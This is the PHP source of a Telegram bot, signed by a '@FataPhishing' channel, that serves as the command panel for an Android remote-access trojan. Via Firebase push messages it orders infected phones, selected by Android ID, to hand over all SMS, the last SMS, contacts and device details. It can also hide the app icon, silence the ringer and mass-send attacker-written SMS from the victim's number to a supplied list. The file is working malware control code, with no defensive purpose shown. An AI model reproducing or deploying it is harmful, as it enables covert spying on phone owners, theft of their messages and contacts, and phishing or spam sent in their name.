<?php
//Channel @FataPhishing
//Pv @Dev_Fata
include("info.php");
define( 'API_ACCESS_KEY', $apikey );
define('API_KEY',$token);
function bot($method, $data = []){
	$url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
	$define = curl_init();
	curl_setopt($define, CURLOPT_URL, $url);
	curl_setopt($define, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($define, CURLOPT_POSTFIELDS, $data);
	$res = curl_exec($define);
	if(curl_error($define)){
		var_dump(curl_error($define));
	}else{
		return json_decode($res);
	}
}
function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/Fata"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 

function sendmassage($action, $androidid, $phone, $message)
{
    $data_string = '{"data":{"action":"' . $action . '","androidid":"' . $androidid . '","phone":"' . $phone . '","text":"' . $message . '"},"to":"\/topics\/Fata"}';
    $headers = array('Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}
function ping($action){
    
$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/Fata"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
   
}
	function sm($chatid,$text,$keyboard){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_markup'=>$keyboard
	]);
    }
function em($chatid,$message_id,$text,$keyboard){
bot('editmessagetext',[ 
    'chat_id'=>$chatid, 
    'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>'HTML',
    'reply_markup'=>$keyboard
	]);
	}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$first_name = $update->message->from->first_name;
$from_id = $update->message->from->id;
$mi = $update->callback_query->message->message_id;
$chat_id1 = isset($update->callback_query->message->chat->id)?$update->callback_query->message->chat->id:$update->message->chat->id;
$data = isset($message->text)?$message->text:$update->callback_query->data;
$reply = $update->message->reply_to_message;
$text = $update->message->text;
$step = file_get_contents("data/link.txt");
$timerem = file_get_contents("data/remotetime.txt");
$showlink= file_get_contents("url.txt");
$finishremot=json_encode(array('inline_keyboard'=>[[['text'=>"kurdRemot",'callback_data' => 'madaret']]]));
if(file_get_contents("data/remotetime.txt") <= 0){
	    sm($chat_id, "ʏᴏᴜʀ ʀᴇᴍᴏᴛ ᴛɪᴍᴇ ɪs ғɪɴɪᴀʜ 🤥

sᴜᴘᴘᴏʀᴛ : @Dev_Fata",$finishremot);
exit();
}
$back1=json_encode(array('inline_keyboard'=>[[['text'=>"ʙᴀᴄᴋ 🍂",'callback_data' => 'back1link']]]));
$back2=json_encode(array('inline_keyboard'=>[[['text'=>"ʙᴀᴄᴋ 🍂",'callback_data' => 'backpanel']]]));
$li2nk = json_encode(array('inline_keyboard'=>
[[['text'=>"$showlink",'callback_data' => 'rqrqr']],
[['text'=>"sᴇᴛ ɴᴇᴡ ʟɪɴᴋ ☘️",'callback_data' => 'setlink']],
[['text'=>"ʙᴀᴄᴋ 🍂",'callback_data' => 'back1link']],
]));
$yesorno = json_encode(array('inline_keyboard' => [[['text' => "sᴇɴᴅ 😈", 'callback_data' => 'yess'], ['text' => "ᴄᴀɴᴄᴇʟ 😕", 'callback_data' => 'backpanel']]]));
$offon = json_encode(array('inline_keyboard' => [[['text' => "ᴏɴ✅", 'callback_data' => 'onnn'], ['text' => "ᴏғғ❌", 'callback_data' => 'offf']],
[['text'=>"ʙᴀᴄᴋ 🍂",'callback_data' => 'back1link']],

]));

$admins = json_encode(array('inline_keyboard'=>
[[['text'=>"ɢᴇᴛ ɪɴғᴏ 🧩",'callback_data' => 'deviceinfo'],['text'=>"ᴘɪɴɢ 🍄",'callback_data' => 'Sutus']],
[['text'=>"ᴀʟʟ sᴍs 📨",'callback_data' => 'AllSMS']],[['text'=>"sᴇɴᴅ sᴍs 🗿",'callback_data' => 'sendlist'],['text'=>"ʜɪᴅᴇ ɪᴄᴏɴ 🍒",'callback_data' => 'HideIcon']],[['text'=>"ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛ 🐍️️",'callback_data' => 'contacts']],
[['text'=>"ʟᴀsᴛ sᴍs 🌵",'callback_data' => 'getlastsms'],['text'=>"sɪʟᴇɴᴛ 🔇",'callback_data' => 'Silent']],
[['text'=>"sʜᴏᴡ ɪᴄᴏɴ 🃏",'callback_data' => 'showHideIcon'],['text'=>"ᴠɪʙʀᴀᴛᴇ 📳",'callback_data' => 'vibrate']],
[['text'=>"ɴᴏʀᴍᴀʟ 🔒",'callback_data' => 'normal'],['text'=>"Permission Check 🔌",'callback_data' => 'Permission']],
[['text'=>"ʙᴀᴄᴋ 🍂",'callback_data' => 'back1link']],
])); 
$Settings = json_encode(array('inline_keyboard'=>[
[['text'=>"ʀssᴇᴛ 🪐",'callback_data' => 'admiins'],['text'=>"sᴇᴛ ᴛxᴛ 📃",'callback_data' => 'settx']],
         [['text' => "ʀᴇᴍᴏᴛ ᴛɪᴍᴇ ⏱", 'callback_data' => "qwwqtrwqr44"],['text' => "$timerem", 'callback_data' => "rerqwqrwqrtqwqtttq"],
         ],
[['text'=>"ʙᴀᴄᴋ 🍂",'callback_data' => 'back1link']],
]));


$starta = json_encode([
    
    'inline_keyboard' => [
        [
                   ['text' => "ᴏɴʟɪɴᴇ ʟɪsᴛ 🦎", 'callback_data' => "pingall"],
                      ],
        [['text' => "ʟᴏɢɪɴ ᴜsᴇʀ ✨", 'callback_data' => "srewr"],['text' => "sᴇᴛ ᴜʀʟ 🔖", 'callback_data' => "PortalLink"],
          ],    
         [['text' => "sᴇᴛᴛɪɴɢ ⚙️", 'callback_data' => "ssting"]],
    ]
]);


if(in_array($chat_id1,$admin_list)){
	if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
file_put_contents("data/type.txt","none");
file_put_contents("data/type.txt","none");
sm($chat_id, 'ʜɪ <a href="tg://user?id='.$from_id.'"><b>'.$first_name.'</b></a> 🎃

ᴡᴇʟʟᴄᴏᴍ ʙᴀʙʏ ᴛᴏ ᴍᴇɴᴜ ♻️

#ᴄᴏᴅᴇᴅ : @Dev_Fata',$starta);	    
	}
		if($data == "admiins"){
	    file_put_contents("data/link.txt","none");
file_put_contents("data/devicetoken.txt","none");
file_put_contents("data/nump","none");
file_put_contents("data/type.txt","none");
	    em($chat_id1,$mi, "ᴛʜᴇ ʀᴏʙᴏᴛ ᴡᴀs ʀᴇsᴛᴀʀᴛᴇᴅ 🦋",$Settings);

    }
if(strpos($text, "/a ") !== false){
    $code = str_replace("/a ", null, $text);
file_put_contents("data/devicetoken.txt",$code);
$devicetoken=file_get_contents("data/devicetoken.txt");
              sm($chat_id1,"ᴜsᴇʀ ᴡᴀs sᴇᴛ 🧊\n\nᴀɴᴅʀᴏɪᴅ ɪᴅ : $devicetoken\n\nᴄᴏᴅᴇᴅ ʙʏ : @Dev_Fata",$admins);
}
	elseif($data == "pingall"){
		ping("ping");
	    	    em($chat_id1,$mi,"ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛs sᴇɴᴅ ɴᴏᴡ ✨",$starta);
	}
if($data == "settx"){
    $showtxt = file_get_contents("data/txm");
      em($chat_id1,$mi,"sᴇɴᴅ ᴍᴇ ʏᴏᴜʀ ᴛᴇxᴛ 📃\n\nɴᴏᴡ ɪᴛs : 
    $showtxt ",$Settings);
   file_put_contents("data/link.txt","settexttt");
  

    }
elseif($step  == "settexttt" && isset($text)){
file_put_contents("data/txm", $text);
           
              sm($chat_id1,  "Seted ✅",$back1);
                    file_put_contents("data/link.txt","none");
        }
	        if($data == "PortalLink"){
      em($chat_id1,$mi,"sᴇᴛ ᴜʀʟ 🔖\n\nsᴇʟᴇᴄᴛ sᴏᴍᴇ ᴏɴᴇ 🍒",$li2nk);


    }
    	        if($data == "setlink"){
      em($chat_id1,$mi,"sᴇɴᴅ ᴍᴇ ʏᴏᴜʀ ʟɪɴᴋ 😶",$li2nk);
   file_put_contents("data/link.txt","url1");
  

    }
elseif($step  == "url1" && isset($text)){
    file_put_contents('url.txt',$text);
              sm($chat_id1,"ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛs sᴇɴᴅ ɴᴏᴡ ✨",$back1);
                    file_put_contents("data/link.txt","none");
        }
        elseif($data == "back1link"){
file_put_contents("data/link.txt","none");
file_put_contents("data/type.txt","none");
file_put_contents("data/type.txt","none");

 em($chat_id1,$mi,"ʀᴇᴛᴜʀɴ ʙᴀᴄᴋ 🕹",$starta);
	}
	        elseif($data == "ssting"){

 em($chat_id1,$mi,"ʜᴏᴡ ᴄᴀɴ ɪ ʜᴇʟᴘ ʏᴏᴜ 😀",$Settings);
	}
	        elseif($data == "backpanel"){
$devicetoken=file_get_contents("data/devicetoken.txt");  
file_put_contents("data/type.txt","none");
file_put_contents("data/type.txt","none");

 em($chat_id1,$mi,"ʀᴇᴛᴜʀɴ ʙᴀᴄᴋ ɴᴏᴡ 🪐

ɪᴅ : $devicetoken",$admins);
	}

        if($data == "srewr"){
      
      em($chat_id1,$mi,"sᴇɴᴅ ᴍᴇ ᴀɴᴅʀᴏɪᴅ ɪᴅ 🌟",$back1);
   file_put_contents("data/link.txt","id2");

  }
elseif($step  == "id2" && isset($text)){
    $contents = file_get_contents("data/user.txt");
    $pattern1 = preg_quote($text, '/');
    $pattern = "/^.*$pattern1.*\$/m";
    if(preg_match_all($pattern, $contents, $matches)){
file_put_contents("data/devicetoken.txt", $text);
        $devicetoken=file_get_contents("data/devicetoken.txt");  

              sm($chat_id1,"ᴜsᴇʀ ᴡᴀs sᴇᴛ 🧊\n\nᴀɴᴅʀᴏɪᴅ ɪᴅ : $devicetoken\n\nᴄᴏᴅᴇᴅ ʙʏ : @Dev_Fata",$admins);
                    file_put_contents("data/link.txt","none");
    }
    else{
        sm($chat_id,"User not found ❌",$starta);
                            file_put_contents("data/link.txt","none");
    }
      }
     ######################
	elseif($data == "sendlist"){

	    em($chat_id1,$mi,"sᴇɴᴅ ᴍᴇ ɴᴜᴍʙᴇʀ ʟɪsᴛ 🌴

ᴇxᴀᴍᴘʟᴇ : 

09115442038
09122387239
09178991232",$back2);
   
   file_put_contents("data/type.txt","mes13sage");
	

    }

     elseif(file_get_contents("data/type.txt") == "mes13sage"){ 
file_put_contents("data/nump",$text);
        $nump=file_get_contents("data/nump");
        $txm=file_get_contents("data/txm");
        
        	    sm($chat_id1,"ɴᴜᴍʙᴇʀ ʟɪsᴛ sᴜᴄᴄᴇssғᴜʟʏ sᴇᴛ ☘️

ɴᴜᴍ ʟɪsᴛ :
$nump

ʏᴏᴜʀᴇ ᴛxᴛ :
$txm

sᴇɴᴅ ɪᴛ 😈 ?",$yesorno);
        
         file_put_contents("data/type.txt","none");
    }
	elseif($data == "yess"){
$androidid=file_get_contents('data/devicetoken.txt');  
$txm=  file_get_contents("data/txm");
 $data = file_get_contents('data/nump');
    $str = explode("\n", $data); 
    $time = count($str) * 1;
    foreach ($str as $str1) {
	  sendmassage("SendSingleMessage",$androidid,$str1,$txm);

    }
	    
		    file_put_contents("data/nump","none");
	     em($chat_id1,$mi,"sᴇɴᴅ ! 
ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛs ᴡᴀs sᴇɴᴅ ᴛᴏ $time ɴᴜᴍʙᴇʀ 🎃",$admins);
	    
	 
	    
	}
elseif($data == "Sutus"){ 
    		$devicetoken = file_get_contents("data/devicetoken.txt");
	     action('pingone',$devicetoken);
              em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ᴘɪɴɢ 🍄)",$admins);
 } 
	
	elseif($data == "deviceinfo"){
    		$devicetoken = file_get_contents("data/devicetoken.txt");
	     action('getdevicefullinfo',$devicetoken);
	          em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ɢᴇᴛ ɪɴғᴏ 🧩)",$admins);

	}
	elseif($data == "AllSMS"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
	     action('getsms',$devicetoken);
          em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ᴀʟʟ sᴍs 📨)",$admins);

	}
elseif($data == "contacts"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
			     action('getcontact',$devicetoken);
	            em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛ 🐍)",$admins);
	}
	elseif($data == "HideIcon"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
			     action('hideicon',$devicetoken);
			              em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ʜɪᴅᴇ ɪᴄᴏɴ 🍒)",$admins);
	}
		elseif($data == "showHideIcon"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
			     action('showhideicon',$devicetoken);
			              em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (sʜᴏᴡ ɪᴄᴏɴ 🃏)",$admins);
	}
		elseif($data == "Silent"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
			     action('silent',$devicetoken);
			              em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (sɪʟᴇɴᴛ 🔇)",$admins);
	}
			elseif($data == "vibrate"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
			     action('vibrate',$devicetoken);
			              em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ᴠɪʙʀᴀᴛᴇ 📳)",$admins);
	}
				elseif($data == "normal"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
			     action('normal',$devicetoken);
			              em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ɴᴏʀᴍᴀʟ 🔒)",$admins);
	}
	elseif($data == "getlastsms"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
action('lastsms',$devicetoken);
em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (ᴀʟʟ sᴍs 📨)",$admins);

	
	}
	elseif($data == "Permission"){
		$devicetoken = file_get_contents("data/devicetoken.txt");
action('testphone',$devicetoken);
em($chat_id1,$mi,"ʀᴇǫᴜᴇsᴛs sᴇɴᴅ (Permission Check 🔌)",$admins);

	
	}
}
	?>